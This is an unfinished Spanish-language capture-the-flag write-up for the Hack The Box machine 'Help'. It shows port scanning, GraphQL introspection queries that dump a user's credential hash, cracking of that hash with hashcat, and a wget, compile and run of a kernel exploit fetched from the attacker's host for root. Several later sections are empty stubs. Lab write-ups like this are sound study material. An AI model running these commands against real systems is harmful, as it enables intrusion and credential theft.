---
title: "Help"
platform: "HTB"
publishedAt: 2025-05-25
cover: "/images/ctf/help-cover.webp"
preview: "Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of credentials for a HelpDesk software. "
tags: []
link: "https://app.hackthebox.com/machines/170/"
toc:
  - text: "🕵️ Introducción"
    id: "introduccion"
  - text: "🔍 1. Reconocimiento"
    id: "1-reconocimiento"
  - text: "🔢 2. Enumeración de servicios"
    id: "2-enumeracion-de-servicios"
  - text: "🔎 3. Análisis e  investigación"
    id: "3-analisis-e-investigacion"
  - text: "💣 4. Acceso inicial o administrativo"
    id: "4-acceso-inicial-o-administrativo"
  - text: "🔓 5. Explotación"
    id: "5-explotacion"
  - text: "🐚 6. Post-explotación"
    id: "6-post-explotacion"
  - text: "🔍 7. Proceso y servicio sospechoso"
    id: "7-proceso-y-servicio-sospechoso"
  - text: "📁 Análisis del miner"
    id: "analisis-del-miner"
  - text: "🕵️‍♂️ 8. Asociación con grupo de amenazas"
    id: "8-asociacion-con-grupo-de-amenazas"
  - text: "🧠 9. IOCs (Indicators of Compromise)"
    id: "9-iocs-indicators-of-compromise"
  - text: "📝 10. Conclusión"
    id: "10-conclusion"
---

---


#            


## 🕵️ Introducción 


Help es una caja Easy Linux que tiene un endpoint GraphQL que puede ser enumerado para obtener un conjunto de credenciales para un software HelpDesk. El software es vulnerable a la inyección SQL ciega que puede ser explotada para obtener una contraseña para el inicio de sesión SSH. Alternativamente, una carga de archivos arbitraria no autenticada puede ser explotada para obtener RCE. El kernel es vulnerable y puede ser explotado para obtener un shell de root.

<details>
<summary>Herramientas y recursos externos utilizados </summary>

</details>


## 🔍 1. Reconocimiento


```shell
└─$ sudo nmap -sC -sV -p- -vvv --min-rate=10000  10.10.10.121 -oA Scan
```


### Puertos abiertos

> "The open ports identified were 22 (SSH), 80 (HTTP – Apache), and 3000 (HTTP – Node.js Express)."

---


## 🔢 2. Enumeración de servicios


22/tcp    open     ssh        syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http       syn-ack ttl 63 Apache httpd 2.4.18
3000/tcp  open     http       syn-ack ttl 63 Node.js Express framework






---


## 🔎 3. Análisis e  investigación  


###  


whatweb help.htb
[http://help.htb](http://help.htb/) [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.121], Title[Apache2 Ubuntu Default Page: It works]


curl -I [http://10.10.10.121:3000](http://10.10.10.121:3000/)


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 81
ETag: W/"51-gr8XZ5dnsfHNaB2KgX/Gxm9yVZU"
Date: Sun, 25 May 2025 19:25:13 GMT
Connection: keep-alive


Buscamos la ruta de graf


─$ ffuf -u [http://10.10.10.121:3000/FUZZ](http://10.10.10.121:3000/FUZZ) -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -H "Content-Type: application/json" -mc 200,400,403


graphql                 [Status: 400, Size: 18, Words: 3, Lines: 1, Duration: 40ms]
:: Progress: [269/269] :: Job [1/1] :: 104 req/sec :: Duration: [0:00:02] :: Errors: 0 ::


enumerando grafhql


```shell
──(villa㉿kali)-[~/ctf/HTB/help/scripts]
└─$ curl -X POST http://10.10.10.121:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'1
{"data":{"__schema":{"types":[{"name":"Query"},{"name":"User"},{"name":"String"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"Boolean"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}    




─(villa㉿kali)-[~/ctf/HTB/help/scripts]
└─$ curl -X POST http://10.10.10.121:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"User\") { name fields { name } } }"}'

{"data":{"__type":{"name":"User","fields":[{"name":"username"},{"name":"password"}]}}}
```



After identifying the `User` data type, introspection revealed accessible queries. A query to retrieve all user credentials was exposed due to lack of access control, resulting in a full data breach.




```shell
─$ curl -s -X POST http://10.10.10.121:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}' | jq .

{
  "data": {
    "__schema": {
      "queryType": {
        "fields": [
          {
            "name": "user"
          }
        ]
      }
    }
  }
}





┌──(villa㉿kali)-[~/ctf/HTB/help/scripts]
└─$ curl -X POST http://10.10.10.121:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { username password } }"}'

{"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}   





$ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force


Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec
```


password 


5d3c93182bb20f07b994a7f617e99cff:godhelpmeplz


Emumeramos directoiros 


──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c [http://help.htb/icons/ubuntu-logo.png](http://help.htb/icons/ubuntu-logo.png)
200      GET      375l      968w    11321c [http://help.htb/](http://help.htb/)
301      GET        9l       28w      306c [http://help.htb/support](http://help.htb/support) => [http://help.htb/support/](http://help.htb/support/)
301      GET        9l       28w      313c [http://help.htb/support/images](http://help.htb/support/images) => [http://help.htb/support/images/](http://help.htb/support/images/)
200      GET       97l      236w     4413c [http://help.htb/support/index.php](http://help.htb/support/index.php)
200      GET        0l        0w        0c [http://help.htb/support/images/index.php](http://help.htb/support/images/index.php)


La ruta de sopporte es  /support 


oObtendremos mas detalles con curl 


```shell
─(villa㉿kali)-[~/ctf/HTB/help]
└─$ curl -i http://help.htb/support

HTTP/1.1 301 Moved Permanently
Date: Sun, 25 May 2025 21:31:25 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: http://help.htb/support/
Content-Length: 306
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://help.htb/support/">here</a>.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at help.htb Port 80</address>
</body></html>
```


## 💣 4. Acceso inicial o administrativo


```shell
wget http://10.10.14.7:8080/44298.c
gcc 44298.c -o rootme -pthread
./rootme
```


## 🔓 5. Explotación


```shell

```


---


```shell

```


## 🐚 6. Post-explotación


### 



```plain text

```


---


## 🔍 7. Proceso y servicio sospechoso


```shell

```


---


---


## 📁 Análisis del miner


```shell

```


Este archivo contiene líneas como:


```plain text

```


## 🕵️‍♂️ 8. Asociación con grupo de amenazas










---


## 🧠 9. IOCs (Indicators of Compromise)


## 📝 10. Conclusión


Este reto combina:

